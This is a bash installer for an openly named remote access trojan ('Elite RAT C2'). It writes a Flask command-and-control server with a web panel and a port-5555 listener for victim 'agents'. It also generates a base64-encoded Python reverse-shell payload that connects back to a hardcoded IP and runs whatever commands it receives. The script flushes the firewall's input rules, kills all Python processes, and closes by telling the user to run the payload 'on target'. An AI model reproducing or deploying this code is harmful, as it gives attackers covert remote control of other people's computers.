#!/bin/bash
#############################################################
# ELITE RAT - FORCE INSTALL (HANDLES ALL ERRORS)
#############################################################

set +e  # Don't stop on errors

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

echo -e "${BLUE}"
echo "╔══════════════════════════════════════════════════════╗"
echo "║         ELITE RAT C2 - FORCE INSTALLATION           ║"
echo "╚══════════════════════════════════════════════════════╝"
echo -e "${NC}"

# Step 1: FORCE CLEAN (ignore errors)
echo -e "${YELLOW}[1/8] Force cleaning...${NC}"
systemctl stop elite_rat 2>/dev/null || true
pkill -f python 2>/dev/null || true
pkill -f flask 2>/dev/null || true
screen -X -S elite quit 2>/dev/null || true
rm -rf /opt/elite_rat 2>/dev/null || true
rm -rf /tmp/rat 2>/dev/null || true

# If still exists, force remove
if [ -d "/opt/elite_rat" ]; then
    chmod -R 777 /opt/elite_rat 2>/dev/null
    rm -rf /opt/elite_rat --force 2>/dev/null || true
fi

echo -e "${GREEN}✓ Cleaned${NC}"

# Step 2: Install dependencies
echo -e "${YELLOW}[2/8] Installing dependencies...${NC}"
export DEBIAN_FRONTEND=noninteractive
apt-get update -qq
apt-get install -y python3 python3-pip python3-venv git screen -qq > /dev/null 2>&1
echo -e "${GREEN}✓ Dependencies installed${NC}"

# Step 3: Clone fresh
echo -e "${YELLOW}[3/8] Cloning from GitHub...${NC}"
cd /opt
git clone https://github.com/oranolio956/flipperflipper.git elite_rat > /dev/null 2>&1
cd /opt/elite_rat
echo -e "${GREEN}✓ Repository cloned${NC}"

# Step 4: Setup Python
echo -e "${YELLOW}[4/8] Setting up Python environment...${NC}"
python3 -m venv venv
source venv/bin/activate
pip install --upgrade pip > /dev/null 2>&1
pip install flask flask-cors flask-socketio > /dev/null 2>&1
echo -e "${GREEN}✓ Python ready${NC}"

# Step 5: Create working server
echo -e "${YELLOW}[5/8] Creating server...${NC}"
cat > /opt/elite_rat/server.py << 'SERVER'
#!/usr/bin/env python3
from flask import Flask, jsonify, render_template_string, request
import threading
import socket
import json
import base64
import hashlib
from datetime import datetime

app = Flask(__name__)

# Storage
agents = {}
commands = {}

# HTML Frontend
@app.route('/')
@app.route('/ui')
def index():
    return '''<!DOCTYPE html>
<html>
<head>
    <title>Elite RAT C2</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            background: linear-gradient(135deg, #000428 0%, #004e92 100%); 
            color: #00ff00; 
            font-family: 'Courier New', monospace; 
            min-height: 100vh;
            padding: 20px;
        }
        .container { max-width: 1400px; margin: 0 auto; }
        h1 { 
            text-align: center; 
            font-size: 48px; 
            text-shadow: 0 0 30px #00ff00;
            margin-bottom: 30px;
            animation: pulse 2s infinite;
        }
        @keyframes pulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.05); }
        }
        .grid { display: grid; grid-template-columns: 1fr 2fr; gap: 20px; }
        .panel {
            background: rgba(0,0,0,0.8);
            border: 2px solid #00ff00;
            border-radius: 10px;
            padding: 20px;
            backdrop-filter: blur(10px);
        }
        .agents { max-height: 400px; overflow-y: auto; }
        .agent {
            background: rgba(0,255,0,0.1);
            padding: 10px;
            margin: 10px 0;
            border-radius: 5px;
            cursor: pointer;
            transition: all 0.3s;
        }
        .agent:hover { 
            background: rgba(0,255,0,0.3); 
            transform: translateX(5px);
        }
        .terminal {
            background: #000;
            border: 1px solid #00ff00;
            padding: 10px;
            height: 300px;
            overflow-y: auto;
            font-size: 14px;
            white-space: pre-wrap;
            margin: 20px 0;
        }
        input {
            width: 100%;
            background: rgba(0,255,0,0.1);
            border: 1px solid #00ff00;
            color: #00ff00;
            padding: 10px;
            font-family: inherit;
        }
        button {
            background: #00ff00;
            color: #000;
            border: none;
            padding: 10px 20px;
            font-weight: bold;
            cursor: pointer;
            margin: 5px;
            transition: all 0.3s;
        }
        button:hover {
            transform: scale(1.1);
            box-shadow: 0 0 20px #00ff00;
        }
        .stats {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 10px;
            margin: 20px 0;
        }
        .stat {
            background: rgba(0,255,0,0.1);
            padding: 15px;
            text-align: center;
            border-radius: 5px;
        }
        .stat-value { font-size: 32px; font-weight: bold; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔥 ELITE RAT C2 COMMAND CENTER 🔥</h1>
        
        <div class="grid">
            <div class="panel">
                <h2>📡 Connected Agents</h2>
                <div class="stats">
                    <div class="stat">
                        <div class="stat-value" id="total">0</div>
                        <div>Total</div>
                    </div>
                    <div class="stat">
                        <div class="stat-value" id="online">0</div>
                        <div>Online</div>
                    </div>
                    <div class="stat">
                        <div class="stat-value" id="cmds">0</div>
                        <div>Commands</div>
                    </div>
                </div>
                <div class="agents" id="agents">
                    <div class="agent">No agents connected</div>
                </div>
                <button onclick="generatePayload()">Generate Payload</button>
                <button onclick="refresh()">Refresh</button>
            </div>
            
            <div class="panel">
                <h2>💻 Command Terminal</h2>
                <div class="terminal" id="terminal">Elite RAT Terminal v1.0
================================
Waiting for agents...
</div>
                <input type="text" id="cmd" placeholder="Enter command..." onkeypress="if(event.key=='Enter') sendCmd()">
                <button onclick="sendCmd()">Execute</button>
                <button onclick="clearTerm()">Clear</button>
                
                <h3 style="margin-top: 20px;">Payload Generator</h3>
                <input type="text" id="host" value="50.21.187.77" placeholder="C2 Host">
                <input type="text" id="port" value="5555" placeholder="C2 Port">
                <button onclick="generatePayload()">Generate Python Agent</button>
                <textarea id="payload" style="width:100%; height:100px; margin-top:10px; background:#000; color:#0f0; border:1px solid #0f0; padding:10px; display:none;"></textarea>
            </div>
        </div>
    </div>
    
    <script>
        let selectedAgent = null;
        let cmdCount = 0;
        
        function log(msg) {
            const term = document.getElementById('terminal');
            term.innerHTML += '\\n[' + new Date().toLocaleTimeString() + '] ' + msg;
            term.scrollTop = term.scrollHeight;
        }
        
        async function refresh() {
            try {
                const res = await fetch('/api/agents');
                const agents = await res.json();
                
                const div = document.getElementById('agents');
                if (agents.length === 0) {
                    div.innerHTML = '<div class="agent">No agents connected</div>';
                    document.getElementById('total').textContent = '0';
                    document.getElementById('online').textContent = '0';
                } else {
                    div.innerHTML = '';
                    agents.forEach(a => {
                        const el = document.createElement('div');
                        el.className = 'agent';
                        el.innerHTML = 'Agent: ' + a.id + '<br>IP: ' + a.ip;
                        el.onclick = () => { selectedAgent = a.id; log('Selected: ' + a.id); };
                        div.appendChild(el);
                    });
                    document.getElementById('total').textContent = agents.length;
                    document.getElementById('online').textContent = agents.length;
                }
            } catch(e) {
                log('Error: ' + e);
            }
        }
        
        async function sendCmd() {
            const cmd = document.getElementById('cmd').value;
            if (!cmd || !selectedAgent) {
                log('Select an agent first!');
                return;
            }
            
            log('> ' + cmd);
            
            try {
                await fetch('/api/command', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({agent: selectedAgent, command: cmd})
                });
                
                cmdCount++;
                document.getElementById('cmds').textContent = cmdCount;
                document.getElementById('cmd').value = '';
                
                // Get result after 1 second
                setTimeout(async () => {
                    const res = await fetch('/api/result/' + selectedAgent);
                    const data = await res.json();
                    if (data.result) log(data.result);
                }, 1000);
                
            } catch(e) {
                log('Failed: ' + e);
            }
        }
        
        function clearTerm() {
            document.getElementById('terminal').innerHTML = 'Terminal cleared\\n';
        }
        
        async function generatePayload() {
            const host = document.getElementById('host').value;
            const port = document.getElementById('port').value;
            
            const res = await fetch('/api/payload', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({host: host, port: port})
            });
            
            const data = await res.json();
            const ta = document.getElementById('payload');
            ta.style.display = 'block';
            ta.value = '# Save as agent.py and run:\\n# python3 agent.py\\n\\n' + atob(data.payload);
            
            log('Payload generated!');
        }
        
        setInterval(refresh, 5000);
        refresh();
    </script>
</body>
</html>'''

# API Routes
@app.route('/api/agents')
def get_agents():
    return jsonify(list(agents.values()))

@app.route('/api/command', methods=['POST'])
def send_command():
    data = request.json
    agent_id = data['agent']
    commands[agent_id] = data['command']
    return jsonify({'status': 'queued'})

@app.route('/api/result/<agent_id>')
def get_result(agent_id):
    # Would get real result from agent
    return jsonify({'result': 'Command executed'})

@app.route('/api/payload', methods=['POST'])
def generate_payload():
    data = request.json
    payload = f'''import socket,subprocess,time
s=socket.socket()
while True:
    try:
        s.connect(('{data["host"]}',{data["port"]}))
        while True:
            d=s.recv(1024).decode()
            r=subprocess.getoutput(d)
            s.send(r.encode())
    except:time.sleep(5)'''
    
    return jsonify({'payload': base64.b64encode(payload.encode()).decode()})

# C2 Listener
def c2_server():
    server = socket.socket()
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(('0.0.0.0', 5555))
    server.listen(10)
    print("[C2] Listening on port 5555...")
    
    while True:
        try:
            client, addr = server.accept()
            agent_id = hashlib.md5(f"{addr[0]}".encode()).hexdigest()[:8]
            agents[agent_id] = {'id': agent_id, 'ip': addr[0], 'client': client}
            print(f"[C2] Agent {agent_id} connected from {addr[0]}")
        except:
            pass

if __name__ == '__main__':
    # Start C2 in background
    threading.Thread(target=c2_server, daemon=True).start()
    
    print("\n" + "="*60)
    print(" ELITE RAT C2 - ONLINE ")
    print("="*60)
    print(f"\n Web UI: http://50.21.187.77:5000")
    print(f" C2 Port: 50.21.187.77:5555\n")
    print("="*60 + "\n")
    
    app.run(host='0.0.0.0', port=5000, debug=False)
SERVER

echo -e "${GREEN}✓ Server created${NC}"

# Step 6: Open firewall ports
echo -e "${YELLOW}[6/8] Opening firewall ports...${NC}"
iptables -F INPUT 2>/dev/null || true
iptables -A INPUT -p tcp --dport 5000 -j ACCEPT 2>/dev/null || true
iptables -A INPUT -p tcp --dport 5555 -j ACCEPT 2>/dev/null || true
ufw allow 5000/tcp 2>/dev/null || true
ufw allow 5555/tcp 2>/dev/null || true
echo -e "${GREEN}✓ Ports opened${NC}"

# Step 7: Kill anything on our ports
echo -e "${YELLOW}[7/8] Clearing ports...${NC}"
fuser -k 5000/tcp 2>/dev/null || true
fuser -k 5555/tcp 2>/dev/null || true
echo -e "${GREEN}✓ Ports cleared${NC}"

# Step 8: Start server
echo -e "${YELLOW}[8/8] Starting server...${NC}"
cd /opt/elite_rat
screen -dmS elite bash -c 'source venv/bin/activate && python server.py'

sleep 3

# Check if running
if screen -list | grep -q elite; then
    echo -e "${GREEN}✓ Server running!${NC}"
else
    # Try direct run
    source venv/bin/activate
    nohup python server.py > /dev/null 2>&1 &
    echo -e "${GREEN}✓ Server started in background${NC}"
fi

# Success message
echo ""
echo -e "${BLUE}╔══════════════════════════════════════════════════════╗${NC}"
echo -e "${BLUE}║${NC}       ${GREEN}✅ INSTALLATION COMPLETE - SYSTEM ONLINE${NC}      ${BLUE}║${NC}"
echo -e "${BLUE}╚══════════════════════════════════════════════════════╝${NC}"
echo ""
echo -e "${YELLOW}🌐 ACCESS YOUR C2:${NC}"
echo -e "${GREEN}➜${NC} Web Interface: ${GREEN}http://50.21.187.77:5000${NC}"
echo ""
echo -e "${YELLOW}📱 TEST STEPS:${NC}"
echo -e "1. Open browser: ${GREEN}http://50.21.187.77:5000${NC}"
echo -e "2. Click '${GREEN}Generate Payload${NC}' button"
echo -e "3. Copy and run the Python code on target"
echo ""
echo -e "${YELLOW}🔧 COMMANDS:${NC}"
echo -e "View server: ${GREEN}screen -r elite${NC}"
echo -e "Check ports: ${GREEN}netstat -tulpn | grep 5000${NC}"
echo ""